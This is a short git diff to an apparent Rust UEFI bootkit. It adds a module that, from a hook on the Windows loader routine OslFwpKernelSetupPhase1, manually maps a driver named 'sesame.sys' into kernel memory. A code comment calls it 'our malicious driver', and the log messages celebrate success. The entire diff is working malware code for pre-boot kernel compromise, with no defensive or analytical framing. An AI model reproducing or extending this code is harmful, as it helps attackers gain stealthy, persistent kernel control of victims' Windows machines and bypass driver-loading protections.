@@ -7,6 +7,7 @@ extern crate alloc;
 mod boot;
 mod global;
 mod hook;
+mod mapper;
 mod utils;
 mod windows;
 
@@ -238,6 +239,14 @@ fn osl_fwp_kernel_setup_phase1_hook(loader_block: *mut LOADER_PARAMETER_BLOCK) -
         driver.SizeOfImage,
     );
     // TODO: setup target driver hook, load our malicious driver
+    log::info!("[*] Start sesame.sys driver mapping to memory");
+    unsafe {
+        mapper::map_driver(
+            DRIVER_ALLOCATED_BUFFER,
+            ntoskrnl.DllBase,
+            driver.EntryPoint as _,
+        );
+    }
     log::info!("[+] WE ARE DONE! See you on the driver's log ;)");
     log::info!("[*] Resuming OslFwpKernelSetupPhase1 execution");
     osl_fwp_kernel_setup_phase1(loader_block)
